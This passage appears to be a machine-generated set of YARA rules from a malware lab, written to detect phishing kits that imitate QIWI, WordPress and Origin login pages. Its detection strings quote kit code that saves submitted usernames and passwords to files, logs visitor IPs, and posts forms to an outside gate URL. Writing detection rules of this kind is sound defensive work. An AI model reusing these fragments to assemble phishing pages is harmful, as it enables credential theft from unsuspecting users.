      $s2 = "<!-- saved from url=(0125)http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '29.00'*/
      $s3 = "                            <a class=\"lostPasswordLink\" href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%" ascii /* score: '28.00'*/
      $s4 = "D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga=\"{&quot;category&quot;:&quot;person-logi" ascii /* score: '28.00'*/
      $s5 = "<form class=\"loginWithCaptcha\" data-validate=\"{}\" method=\"POST\" action=\"http://kotfake.net/gate.php\" novalidate=\"novali" ascii /* score: '27.00'*/
      $s6 = "            <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B" ascii /* score: '26.00'*/
      $s7 = "<script src=\"https://static.qiwi.com/njsf/qiwi-wallet-legacy/1.3.0-19-g5e24222/legacy.js\"></script>" fullword ascii /* score: '23.00'*/
      $s8 = "    <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%" ascii /* score: '21.00'*/
      $s9 = "%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga-link-open=\"SMS/USSD-" fullword ascii /* score: '21.00'*/
      $s10 = "                <a href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '21.00'*/
      $s11 = "%BE%D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\" data-ga-link-open=\"" fullword ascii /* score: '21.00'*/
      $s12 = "</select><span class=\"ui-selectmenu-button\"><a class=\"ui-button ui-widget ui-state-default ui-corner-all language-list-select" ascii /* score: '20.00'*/
      $s13 = "<!-- saved from url=(0125)http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%BE%D0%BF%D0%B8%D1%80%D0%BE%" ascii /* score: '20.00'*/
      $s14 = "<form class=\"loginWithCaptcha\" data-validate=\"\" method=\"POST\" action=\"log.php\" novalidate=\"novalidate\">" fullword ascii /* score: '19.00'*/
      $s15 = "                <a class=\"lostPasswordLink\" href=\"http://prot-spb.ru/qiwi/2a8bd96f71085a833a0bd5a05f47447e%20%D0%A1%D0%BA%D0%" ascii /* score: '18.00'*/
      $s16 = "D0%BF%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C\" data-ga=\"{&quot;category&quot;:&quot;login-form&quot;,&quot;action&quot;:&quo" ascii /* score: '18.00'*/
      $s17 = "            <button class=\"fullOrangeBtn\" data-href=\"\" data-target=\"_self\" style=\"margin: -1px 0 0 40px;\" data-ga=\"{&qu" ascii /* score: '18.00'*/
      $s18 = "1%82%D1%8C\" target=\"_self\">" fullword ascii /* score: '17.00'*/
      $s19 = "0%B2%D0%B0%D1%82%D1%8C\" target=\"_self\">" fullword ascii /* score: '17.00'*/
      $s20 = " https://w.qiwi.com&quot;,&quot;title&quot;:&quot;Visa QIWI Wallet " fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_proxy {
   meta:
      description = "phish__wordpress - file proxy.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "42c8b60137736940afedc7fc2b8c0994d352338490beafb5a4867494633179de"
   strings:
      $s1 = "<!-- saved from url=(0034)https://sso.qiwi.com/app/proxy?v=1 -->" fullword ascii /* score: '30.00'*/
      $s2 = "<!-- a padding to disable MSIE and Chrome friendly error page -->" fullword ascii /* score: '25.00'*/
      $s3 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"><title>403 Forbidden</title></head>" fullword ascii /* score: '17.00'*/
      $s4 = "<center><h1>403 Forbidden</h1></center>" fullword ascii /* score: '4.00'*/
      $s5 = "<hr><center>nginx</center>" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x3c0a and filesize < 2KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_login {
   meta:
      description = "phish__wordpress - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "03f0c9ac7a239e08014ad26010c8d2eb773acc19e0fd2d26cc7c078291e73962"
   strings:
      $s1 = "<a href=\"http://localhost/wp-login.php?action=lostpassword\">Lost your password?</a>" fullword ascii /* score: '25.00'*/
      $s2 = "<form name=\"loginform\" id=\"loginform\" action=\"login.php\" method=\"post\">" fullword ascii /* score: '23.00'*/
      $s3 = "<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-US\"><!--<![endif]--><head>" fullword ascii /* score: '20.00'*/
      $s4 = "<label for=\"user_login\">Username or Email Address<br>" fullword ascii /* score: '18.00'*/
      $s5 = "<p id=\"backtoblog\"><a href=\"http://localhost/\">" fullword ascii /* score: '16.00'*/
      $s6 = "<body class=\"login login-action-login wp-core-ui  locale-en-us\">" fullword ascii /* score: '14.00'*/
      $s7 = "<h1><a href=\"https://wordpress.org/\" title=\"Powered by WordPress\" tabindex=\"-1\">Powered by WordPress</a></h1>" fullword ascii /* score: '13.00'*/
      $s8 = "<label for=\"user_pass\">Password<br>" fullword ascii /* score: '12.00'*/
      $s9 = "<input name=\"log\" id=\"user_login\" class=\"input\" size=\"20\" type=\"text\"></label>" fullword ascii /* score: '11.00'*/
      $s10 = "<input name=\"redirect_to\" value=\"http://localhost/wp-admin/\" type=\"hidden\">" fullword ascii /* score: '11.00'*/
      $s11 = "<link rel=\"dns-prefetch\" href=\"http://s.w.org/\">" fullword ascii /* score: '10.00'*/
      $s12 = "<meta name=\"robots\" content=\"noindex,follow\">" fullword ascii /* score: '9.00'*/
      $s13 = "<title>Log In " fullword ascii /* score: '9.00'*/
      $s14 = "<input name=\"pwd\" id=\"user_pass\" class=\"input\" value=\"\" size=\"20\" type=\"password\"></label>" fullword ascii /* score: '8.00'*/
      $s15 = "<input name=\"testcookie\" value=\"1\" type=\"hidden\">" fullword ascii /* score: '7.00'*/
      $s16 = "<link rel=\"stylesheet\" href=\"index_files/load-styles.css\" type=\"text/css\" media=\"all\">" fullword ascii /* score: '7.00'*/
      $s17 = "<html xmlns=\"http://www.w3.org/1999/xhtml\" class=\"ie8\" lang=\"en-US\">" fullword ascii /* score: '6.00'*/
      $s18 = "<p class=\"forgetmenot\"><label for=\"rememberme\"><input name=\"rememberme\" id=\"rememberme\" value=\"forever\" type=\"checkbo" ascii /* score: '5.00'*/
      $s19 = "<p class=\"forgetmenot\"><label for=\"rememberme\"><input name=\"rememberme\" id=\"rememberme\" value=\"forever\" type=\"checkbo" ascii /* score: '5.00'*/
      $s20 = "<input name=\"wp-submit\" id=\"wp-submit\" class=\"button button-primary button-large\" value=\"Log In\" type=\"submit\">" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 5KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_file {
   meta:
      description = "phish__wordpress - file file.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a13cb8687feb41e7de247fbb1cf5d4231853253b3a89feb96d2d8f76a43fa6f5"
   strings:
      $s1 = "by Jacksida" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7962 and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_log {
   meta:
      description = "phish__wordpress - file log.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1cf514d8f033f6ff44cd9258bdf08e105d44c62245a7a5b7fbdc62c6372c2480"
   strings:
      $s1 = "echo \"<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=qiwi.com/'></head></html>\";" fullword ascii /* score: '27.00'*/
      $s2 = "$Pass = $_POST['Password'];" fullword ascii /* score: '17.00'*/
      $s3 = "$Log = $_POST['Nickname'];" fullword ascii /* score: '14.00'*/
      $s4 = "$log = fopen(\"file.php\",\"a+\");" fullword ascii /* score: '12.00'*/
      $s5 = "fwrite($log,\"\\n $Log:$Pass \\n\");" fullword ascii /* score: '12.00'*/
      $s6 = "fclose($log);" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule load_styles {
   meta:
      description = "phish__wordpress - file load-styles.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "8fabaf6789ee0a389057597cbcdb1fb8df07efae6c09a81489a05f0f336c15ea"
   strings:
      $x1 = "#your-profile label+a,.wp-admin select,fieldset label,label{vertical-align:middle}#pass-strength-result,.color-option,input,text" ascii /* score: '52.00'*/
      $x2 = "#your-profile label+a,.wp-admin select,fieldset label,label{vertical-align:middle}#pass-strength-result,.color-option,input,text" ascii /* score: '52.00'*/
      $x3 = "@font-face{font-family:dashicons;src:url(../wp-includes/fonts/dashicons.eot)}@font-face{font-family:dashicons;src:url(data:appli" ascii /* score: '51.00'*/
      $s4 = ".wp-core-ui .button,.wp-core-ui .button-primary,.wp-core-ui .button-secondary{display:inline-block;text-decoration:none;font-siz" ascii /* score: '30.00'*/
      $s5 = ".request-filesystem-credentials-dialog .ftp-username{margin-bottom:1em}.request-filesystem-credentials-dialog .ftp-password{marg" ascii /* score: '28.00'*/
      $s6 = "ancel-button{display:inline}.request-filesystem-credentials-dialog .ftp-password,.request-filesystem-credentials-dialog .ftp-use" ascii /* score: '28.00'*/
      $s7 = "ls-dialog .ftp-password{margin:0}.request-filesystem-credentials-dialog .ftp-password em{color:#888}.request-filesystem-credenti" ascii /* score: '28.00'*/
      $s8 = "in:0}.request-filesystem-credentials-dialog .ftp-password em{color:#888}.request-filesystem-credentials-dialog label{display:blo" ascii /* score: '28.00'*/
      $s9 = "rname{float:none;width:auto}.request-filesystem-credentials-dialog .ftp-username{margin-bottom:1em}.request-filesystem-credentia" ascii /* score: '28.00'*/
      $s10 = ".request-filesystem-credentials-dialog .ftp-password,.request-filesystem-credentials-dialog .ftp-username{float:none;width:auto}" ascii /* score: '28.00'*/
      $s11 = "weak,.show-password #pass1{display:none}input[type=checkbox]:checked:before{content:\"\\f147\";margin:-3px 0 0 -4px;color:#1e8cb" ascii /* score: '27.00'*/
      $s12 = "g label[for=public_key],.request-filesystem-credentials-dialog label[for=private_key]{display:block;margin-bottom:1em}.request-f" ascii /* score: '26.00'*/
      $s13 = "background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.13)}.login form .forgetmenot{font-weight:400;float:left;margin-bottom:0}.login " ascii /* score: '24.00'*/
      $s14 = "t-size:14px}.login form .forgetmenot label{font-size:12px;line-height:19px}.login h1 a{background-image:url(images/w-logo-blue.p" ascii /* score: '24.00'*/
      $s15 = "ilesystem-credentials-dialog .request-filesystem-credentials-action-buttons{text-align:right}.login #pass-strength-result,.login" ascii /* score: '24.00'*/
      $s16 = "s:before{content:\"\\f106\"}.dashicons-admin-users:before{content:\"\\f110\"}.dashicons-admin-tools:before{content:\"\\f107\"}.d" ascii /* score: '23.00'*/
      $s17 = "ore{content:\"\\f133\"}.dashicons-welcome-view-site:before{content:\"\\f115\"}.dashicons-welcome-widgets-menus:before{content:\"" ascii /* score: '23.00'*/
      $s18 = "-dialog #auth-keys-desc{margin-bottom:0}#request-filesystem-credentials-dialog .button:not(:last-child){margin-right:10px}#reque" ascii /* score: '23.00'*/
      $s19 = "quest-filesystem-credentials-dialog #auth-keys-desc{margin-bottom:0}#request-filesystem-credentials-dialog .button:not(:last-chi" ascii /* score: '23.00'*/
      $s20 = "og label[for=hostname],.request-filesystem-credentials-dialog label[for=public_key],.request-filesystem-credentials-dialog label" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_index {
   meta:
      description = "phish__wordpress - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_login_2 {
   meta:
      description = "phish__wordpress - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "487c3606216b08d8480143809b82b7e504a7b7d3fcaa51d3ed7db20faaf5846c"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['log'] . \" Pass: \" . $_POST['pwd'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '29.00'*/
      $s2 = "header('Location: https://wordpress.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_ip {
   meta:
      description = "phish__wordpress - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__origin/phish__origin_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__origin
   Reference: phish__origin phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_SIGN_IN_files_api {
   meta:
      description = "phish__origin - file api.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a3749644de7613642af5b258e30b0021b8758f54f4f80b2e75c53c6741f9f174"
   strings:
      $s1 = "/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function() {var CFG='___grecaptcha_cfg';if(!window[CFG]){window[CFG]={};}var GR='g" ascii /* score: '28.00'*/
      $s2 = "document.createElement('script');po.type='text/javascript';po.async=true;po.src='https://www.gstatic.com/recaptcha/api2/v1528855" ascii /* score: '22.00'*/
      $s3 = ");if(n){po.setAttribute('nonce',n);}var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(po, s);})();" fullword ascii /* score: '15.00'*/
      $s4 = "115741/recaptcha__en.js';var elem=document.querySelector('script[nonce]');var n=elem&&(elem['nonce']||elem.getAttribute('nonce')" ascii /* score: '11.00'*/
      $s5 = "/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function() {var CFG='___grecaptcha_cfg';if(!window[CFG]){window[CFG]={};}var GR='g" ascii /* score: '4.00'*/
      $s6 = "recaptcha';if(!window[GR]){window[GR]={};}window[GR].ready=window[GR].ready||function(f){(window[CFG]['fns']=window[CFG]['fns']|" ascii /* score: '3.00'*/
      $s7 = "1528855115741" ascii /* score: '1.00'*/
      $s8 = "|[]).push(f);};(window[CFG]['render']=window[CFG]['render']||[]).push('onload');window['__google_recaptcha_client']=true;var po=" ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 2KB and
      all of them
}

rule recaptcha__en {
   meta:
      description = "phish__origin - file recaptcha__en.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "802f005cedac2ee562b3e02cfc9cb8188be89802d3abb3074fccffc0db7cb15b"
   strings:
      $x1 = "break;case 8:b+=\"ERROR for site owner: Invalid key type\";break;case 9:b+=\"ERROR for site owner: Invalid package name\";break;" ascii /* score: '40.00'*/
      $x2 = "n.xa=function(a,b){if(b)return vp(this.l,a),aq.I.xa.call(this,a,b);Z(this,a,M(\"rc-defaultchallenge-incorrect-response\",void 0)" ascii /* score: '37.00'*/
      $x3 = "V(Kq({id:a.pb,name:a.qb,display:!0}))+\"</div>\")};var Pq=function(a){var b=a.pb,c=a.qb;return U('<div class=\"grecaptcha-badge" ascii /* score: '37.00'*/
      $x4 = "Vp.prototype.Ea=function(){this.l.push([]);this.Qa();if(3<this.l.length)return!1;lp(this,!1);Q(function(){lp(this,!0)},500,this)" ascii /* score: '34.00'*/
      $x5 = "var re=function(a,b,c){v(c)&&(c=c.join(\" \"));var d=\"aria-\"+b;\"\"===c||void 0==c?(Zc||(Zc={atomic:!1,autocomplete:\"none\",d" ascii /* score: '33.00'*/
      $x6 = "d);pj(g);qj(g,!1,a)};f=b.attributes||{};Yb(f,{type:\"text/javascript\",charset:\"UTF-8\"});Nd(e,f);Cd(e,a);Aj(c).appendChild(e);" ascii /* score: '33.00'*/
      $x7 = "\"Alternatively, download audio as MP3\".replace(Ql,Rl);return U(a+'\"></a>')},ip=function(a){a=a||{};var b=\"\";a.Be||(b+=\"Pre" ascii /* score: '32.00'*/
      $s8 = "Of()};Jm.prototype.execute=function(a,b){this.o.then(function(b){b.invoke(function(b){a(b)})},function(){b()})};var Km=function(" ascii /* score: '30.00'*/
      $s9 = "'<div class=\"'+W(\"rc-prepositional-attribution\")+'\">';b+=\"Sources: \";a=a.dd;for(var c=a.length,d=0;d<c;d++)b+='<a target=" ascii /* score: '30.00'*/
      $s10 = "'\"><div id=\"rc-text-target\" class=\"'+W(\"rc-text-target\")+'\" dir=\"ltr\">';a=a.fe;var d=10>a.length?1:2,e=a.length/d;var f" ascii /* score: '30.00'*/
      $s11 = "function Yr(a,b){try{return a[Zr(b)]}catch(c){return null}}function $r(a){try{return a[Zr(\"175206285a0d021a170b714d210f1758\")]" ascii /* score: '30.00'*/
      $s12 = "(e=null)}}else\"mouseover\"==c?e=a.fromElement:\"mouseout\"==c&&(e=a.toElement);this.relatedTarget=e;null===d?(this.clientX=void" ascii /* score: '30.00'*/
      $s13 = "p.window&&p.window.__google_recaptcha_client&&(p.window.___grecaptcha_cfg||Ta(\"___grecaptcha_cfg\",{}),p.window.___grecaptcha_c" ascii /* score: '28.00'*/
      $s14 = "var b=a.contentWindow;a=b.document;a.open();a.write(\"\");a.close();var c=\"callImmediate\"+Math.random(),d=\"file:\"==b.locatio" ascii /* score: '28.00'*/
      $s15 = "users, we can\\'t process your request right now. For more details visit <a href=\"https://developers.google.com/recaptcha/docs/" ascii /* score: '27.00'*/
      $s16 = "he=function(a,b){var c=[];ge(a,b,c,!1);return c},ge=function(a,b,c,d){if(null!=a)for(a=a.firstChild;a;){if(b(a)&&(c.push(a),d)||" ascii /* score: '27.00'*/
      $s17 = "ew challenge, click the reload icon. <a href=\"https://support.google.com/recaptcha\" target=\"_blank\">Learn more.</a>')};var a" ascii /* score: '26.00'*/
      $s18 = "k the reload icon. <a href=\"https://support.google.com/recaptcha\" target=\"_blank\">Learn more.</a>':" fullword ascii /* score: '26.00'*/
      $s19 = "ion and reload.<br><br><a href=\"https://support.google.com/recaptcha#6262736\" target=\"_blank\">Why is this happening to me?</" ascii /* score: '26.00'*/
      $s20 = "t clear, or to get a new challenge, reload the challenge.<a href=\"https://support.google.com/recaptcha\" target=\"_blank\">Lear" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_SIGN_IN_files_otk {
   meta:
      description = "phish__origin - file otk.css"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "967bb61b4eb3b1f2c0736f0c7a19976cce0485b0bd3c5e4b9abe2a7e6ec1d42c"
   strings:
      $x1 = " */@-webkit-keyframes otkslidefromleft{0%{opacity:0;filter:alpha(opacity=0);-webkit-transform:translate3d(-40px,0,0);transform:t" ascii /* score: '55.00'*/
      $s2 = " * OTK v1.2.23 (http://docs.x.origin.com)" fullword ascii /* score: '21.00'*/
      $s3 = "\"}.otkicon-profile:before{content:\"\\e606\"}.otkicon-download:before{content:\"\\e61c\"}.otkicon-downloadnegative:before{conte" ascii /* score: '21.00'*/
      $s4 = "{content:\"\\e600\"}.otkicon-twitter:before{content:\"\\e626\"}.otkicon-checkcircle:before{content:\"\\e60b\"}.otkicon-check:bef" ascii /* score: '20.00'*/
      $s5 = "con-add:before{content:\"\\e60f\"}.otkicon-search:before{content:\"\\e601\"}.otkicon-originlogo:before{content:\"\\e604\"}.otkic" ascii /* score: '20.00'*/
      $s6 = "con-pausecircle:before{content:\"\\e612\"}.otkicon-join:before{content:\"\\e623\"}.otkicon-dlc:before{content:\"\\e61f\"}.otkico" ascii /* score: '20.00'*/
      $s7 = "otkicon-chatbubble:before{content:\"\\e602\"}.otkicon-closecircle:before{content:\"\\e610\"}.otkicon-play:before{content:\"\\e60" ascii /* score: '20.00'*/
      $s8 = "13\"}.otkicon-person:before{content:\"\\e606\"}.otkicon-leftarrowcircle:before{content:\"\\e605\"}.otkicon-rightarrowcircle:befo" ascii /* score: '20.00'*/
      $s9 = "before{content:\"\\e664\"}.otkicon-challenge:before{content:\"\\e665\"}.otkicon-play-with-circle:before{content:\"\\e64c\"}.otki" ascii /* score: '20.00'*/
      $s10 = "ng-no-circle:before{content:\"\\e64b\"}.otkicon-maximize:before{content:\"\\e64a\"}.otkicon-multiplayer:before{content:\"\\e649" ascii /* score: '20.00'*/
      $s11 = "l{display:none}.otkprogress-radial-iscomplete .otkprogress-percent{display:none}.otkprogress-radial-iscomplete:after{content:\"" ascii /* score: '18.00'*/
      $s12 = "tion:otkslidefromleft .4s cubic-bezier(0.175,0.885,0.32,1.275)}.otkinput-iserror:after,.otktextarea-iserror:after{content:\"\\e6" ascii /* score: '18.00'*/
      $s13 = ":before{content:\"\\e61d\"}.otkicon-apple:before{content:\"\\e61e\"}.otkicon-key:before{content:\"\\e61a\"}.otkicon-save:before{" ascii /* score: '18.00'*/
      $s14 = "2\"}.otkicon-sortdown:before{content:\"\\e642\"}.otkicon-lockclosed:before{content:\"\\e633\"}.otkicon-lockopen:before{content:" ascii /* score: '18.00'*/
      $s15 = "0.84,0.44,1);opacity:0;background-clip:padding-box}.otkdropdown-wrap:after,.otkdropdown-wrap:before{content:\"\";position:absolu" ascii /* score: '17.00'*/
      $s16 = "\\e615\"}.otkicon-cloud:before{content:\"\\e616\"}.otkicon-star:before{content:\"\\e614\"}.otkicon-warning:before{content:\"\\e6" ascii /* score: '16.00'*/
      $s17 = "ut}.otkbtn-command:hover{border:1px solid #f56c2d;-webkit-box-shadow:0 0 1px 0 #f56c2d;box-shadow:0 0 1px 0 #f56c2d}.otkbtn-comm" ascii /* score: '16.00'*/
      $s18 = "-radius:4px}.otkbtn-command{position:relative;min-width:100%;padding:25px 20px;border-radius:6px;border:1px solid #c3c6ce;backgr" ascii /* score: '16.00'*/
      $s19 = "\\e621\"}.otkicon-trophy:before{content:\"\\e61b\"}.otkicon-pause:before{content:\"\\e625\"}.otkicon-microphone:before{content:" ascii /* score: '16.00'*/
      $s20 = "ntent:\"\\e646\"}.otkicon-timer:before{content:\"\\e647\"}.otkicon-article:before{content:\"\\e648\"}.otkicon-sortup:before{cont" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule www_widgetapi {
   meta:
      description = "phish__origin - file www-widgetapi.js"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a599232b27762d0deef401c854b6c5f7f9f7b69c63a22fdf36b99bac156946fc"
   strings:
      $x1 = "Wa.prototype.g=function(a){if(a.origin==V(this,\"host\")||a.origin==V(this,\"host\").replace(/^http:/,\"https:\")){try{var b=JSO" ascii /* score: '32.00'*/
      $x2 = ";function Wa(a){this.b=a||{};this.f={};this.c=this.a=!1;a=document.getElementById(\"www-widgetapi-script\");if(this.a=!!(\"https" ascii /* score: '31.00'*/
      $s3 = ";function Wa(a){this.b=a||{};this.f={};this.c=this.a=!1;a=document.getElementById(\"www-widgetapi-script\");if(this.a=!!(\"https" ascii /* score: '24.00'*/
      $s4 = "h.B=function(a){a.id=this.g;a.channel=\"widget\";a=xa(a);var b=this.b;var c=Ba(this.a.src);b=0==c.indexOf(\"https:\")?[c]:b.a?[c" ascii /* score: '22.00'*/
      $s5 = "function qa(){var a=k.MessageChannel;\"undefined\"===typeof a&&\"undefined\"!==typeof window&&window.postMessage&&window.addEven" ascii /* score: '22.00'*/
      $s6 = "h.B=function(a){a.id=this.g;a.channel=\"widget\";a=xa(a);var b=this.b;var c=Ba(this.a.src);b=0==c.indexOf(\"https:\")?[c]:b.a?[c" ascii /* score: '21.00'*/
      $s7 = "function Q(a){this.type=\"\";this.source=this.data=this.currentTarget=this.relatedTarget=this.target=null;this.charCode=this.key" ascii /* score: '21.00'*/
      $s8 = "function Ha(a,b){var c=m(\"yt.logging.errors.log\");c?c(a,b,void 0,void 0,void 0):(c=[],c=\"ERRORS\"in P?P.ERRORS:c,c.push([a,b," ascii /* score: '19.00'*/
      $s9 = "function Ha(a,b){var c=m(\"yt.logging.errors.log\");c?c(a,b,void 0,void 0,void 0):(c=[],c=\"ERRORS\"in P?P.ERRORS:c,c.push([a,b," ascii /* score: '19.00'*/
      $s10 = "function v(a,b){var c=a.split(\".\"),d=k;c[0]in d||\"undefined\"==typeof d.execScript||d.execScript(\"var \"+c[0]);for(var e;c.l" ascii /* score: '19.00'*/
      $s11 = "function v(a,b){var c=a.split(\".\"),d=k;c[0]in d||\"undefined\"==typeof d.execScript||d.execScript(\"var \"+c[0]);for(var e;c.l" ascii /* score: '19.00'*/
      $s12 = "lace(\"http:\",\"https:\")]:b.c?[c]:[c,c.replace(\"http:\",\"https:\")];if(!this.a.contentWindow)throw Error(\"The YouTube playe" ascii /* score: '18.00'*/
      $s13 = "h.F=function(){this.a&&this.a.contentWindow?this.B({event:\"listening\"}):window.clearInterval(this.c)};" fullword ascii /* score: '18.00'*/
      $s14 = "Wa.prototype.g=function(a){if(a.origin==V(this,\"host\")||a.origin==V(this,\"host\").replace(/^http:/,\"https:\")){try{var b=JSO" ascii /* score: '18.00'*/
      $s15 = "return function(a){d.next={D:a};d=d.next;b.port2.postMessage(0)}}return\"undefined\"!==typeof document&&\"onreadystatechange\"in" ascii /* score: '18.00'*/
      $s16 = "function Ya(a,b){for(var c=document.createElement(\"iframe\"),d=b.attributes,e=0,g=d.length;e<g;e++){var f=d[e].value;null!=f&&" ascii /* score: '18.00'*/
      $s17 = "\"mouseout\"==this.type&&(b=a.toElement);this.relatedTarget=b;this.clientX=void 0!=a.clientX?a.clientX:a.pageX;this.clientY=void" ascii /* score: '17.00'*/
      $s18 = "function Q(a){this.type=\"\";this.source=this.data=this.currentTarget=this.relatedTarget=this.target=null;this.charCode=this.key" ascii /* score: '17.00'*/
      $s19 = "a(a.src):\"https://www.youtube.com\"),this.b=new Wa(b),c||(b=Ya(this,a),this.h=a,(c=a.parentNode)&&c.replaceChild(b,a),a=b),this" ascii /* score: '17.00'*/
